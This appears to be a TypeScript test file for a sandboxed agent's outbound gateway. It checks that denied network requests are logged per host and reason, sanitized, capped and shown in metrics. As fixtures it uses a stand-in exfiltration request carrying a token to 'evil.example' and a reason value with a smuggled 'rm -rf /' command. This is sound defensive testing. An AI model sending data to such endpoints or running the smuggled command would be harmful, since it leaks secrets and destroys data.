import { env, runInDurableObject } from "cloudflare:test";
import { describe, expect, it } from "vitest";
import { type GitCredential, handleOutbound, type OutboundDeps } from "../../src/outbound-gateway";
import {
  addOutboundDenied,
  OUTBOUND_DENIED_MAX_ENTRIES,
  sanitizeOutboundDenied,
} from "../../src/outbound-denied";

// 拒否した外向き通信を、タスクごとに {host, reason} で数える（task_result の usage.outbound_denied になる）。
// host は検証したホスト名だけ、reason は既存の固定の違反コードだけ。

const NOW = 1_800_000_000_000;
const CRED: GitCredential = { token: "ghs_x", expiresAt: NOW + 3_600_000 };

function setup(over: Partial<OutboundDeps> = {}) {
  const recorded: [string, string][] = [];
  const deps: OutboundDeps = {
    props: { repo: { owner: "acme", name: "hello" }, task: "agent/task-t1", taskId: "t1" },
    readCredential: async () => CRED,
    readPushPermit: async () => undefined,
    fetchUpstream: async () => new Response("ok"),
    now: () => NOW,
    audit: () => {},
    recordDenied: (host, reason) => void recorded.push([host, reason]),
    ...over,
  };
  return { deps, recorded };
}

describe("handleOutbound: 拒否を recordDenied に渡す", () => {
  it("拒否したときだけ、ホスト名と固定の違反コードを渡す（path・query は渡さない）", async () => {
    const { deps, recorded } = setup();
    await handleOutbound(new Request("https://evil.example/exfil?token=abc"), deps);
    await handleOutbound(
      new Request("https://github.com/acme/other.git/info/refs?service=git-upload-pack"),
      deps,
    );
    await handleOutbound(new Request("https://pypi.org/simple/x", { method: "POST", body: "x" }), deps);
    await handleOutbound(new Request("https://registry.npmjs.org/tiny"), deps);
    expect(recorded).toEqual([
      ["evil.example", "host_not_allowed"],
      ["github.com", "github_other_repo"],
      ["pypi.org", "registry_method"],
    ]);
  });

  it("recordDenied が投げても、拒否の応答は変わらない", async () => {
    const { deps } = setup({
      recordDenied: () => {
        throw new Error("boom");
      },
    });
    const res = await handleOutbound(new Request("https://evil.example/"), deps);
    expect(res.status).toBe(403);
  });
});

describe("addOutboundDenied / sanitizeOutboundDenied", () => {
  it("{host, reason} ごとに数え、合計も数える", () => {
    let s = addOutboundDenied(undefined, "evil.example", "host_not_allowed");
    s = addOutboundDenied(s, "evil.example", "host_not_allowed");
    s = addOutboundDenied(s, "github.com", "github_other_repo");
    s = addOutboundDenied(s, "evil.example", "non_https");
    expect(s).toEqual({
      entries: [
        { host: "evil.example", reason: "host_not_allowed", count: 2 },
        { host: "github.com", reason: "github_other_repo", count: 1 },
        { host: "evil.example", reason: "non_https", count: 1 },
      ],
      total: 4,
    });
  });

  it("表に無い reason は数えない。検証できないホストは合計だけに数える", () => {
    let s = addOutboundDenied(undefined, "evil.example", "made_up");
    s = addOutboundDenied(s, "evil.example", "host_not_allowed; rm -rf /");
    expect(s).toEqual({ entries: [], total: 0 });
    s = addOutboundDenied(s, "[::1]", "host_not_allowed");
    s = addOutboundDenied(s, "Evil.Example/../x", "host_not_allowed");
    expect(s).toEqual({ entries: [], total: 2 });
  });

  it(`異なる組は最大 ${OUTBOUND_DENIED_MAX_ENTRIES} 件。超えた分は合計だけに数える`, () => {
    let s = undefined as ReturnType<typeof addOutboundDenied> | undefined;
    for (let i = 0; i < 25; i++) s = addOutboundDenied(s, `h${i}.example`, "host_not_allowed");
    s = addOutboundDenied(s, "h0.example", "host_not_allowed");
    s = addOutboundDenied(s, "h24.example", "host_not_allowed");
    expect(s?.entries).toHaveLength(OUTBOUND_DENIED_MAX_ENTRIES);
    expect(s?.entries[0]).toEqual({ host: "h0.example", reason: "host_not_allowed", count: 2 });
    expect(s?.total).toBe(27);
  });

  it("sanitize: 形の正しい要素だけを残す", () => {
    expect(
      sanitizeOutboundDenied([
        { host: "evil.example", reason: "host_not_allowed", count: 3 },
        { host: "bad host", reason: "host_not_allowed", count: 1 },
        { host: "x.example", reason: "nope", count: 1 },
        { host: "x.example", reason: "non_https", count: 1.5 },
        { host: "x.example", reason: "non_https", count: -1 },
        "junk",
        null,
      ]),
    ).toEqual([{ host: "evil.example", reason: "host_not_allowed", count: 3 }]);
    expect(sanitizeOutboundDenied("x")).toEqual([]);
  });
});

// biome-ignore lint/suspicious/noExplicitAny: private メンバーを触るテスト
type Inst = any;
const runInDO = runInDurableObject as unknown as (
  stub: unknown,
  fn: (inst: Inst) => Promise<void>,
) => Promise<void>;

describe("SandboxDO.recordOutboundDenied → metrics", () => {
  it("記録が metrics の outboundDenied / outboundDeniedTotal に出る。不正な値は出ない", async () => {
    const stub = (env.SANDBOX_DO as DurableObjectNamespace).getByName("outbound-denied-count");
    await runInDO(stub, async (inst) => {
      expect((await inst.metrics()).outboundDenied).toBeUndefined();
      await inst.recordOutboundDenied("evil.example", "host_not_allowed");
      await inst.recordOutboundDenied("evil.example", "host_not_allowed");
      await inst.recordOutboundDenied("github.com", "github_other_repo");
      await inst.recordOutboundDenied("evil example", "host_not_allowed");
      await inst.recordOutboundDenied("evil.example", "<script>");
      await inst.recordOutboundDenied({ toString: () => "x" }, 3);
      const m = await inst.metrics();
      expect(m.outboundDenied).toEqual([
        { host: "evil.example", reason: "host_not_allowed", count: 2 },
        { host: "github.com", reason: "github_other_repo", count: 1 },
      ]);
      expect(m.outboundDeniedTotal).toBe(4);
    });
  });
});
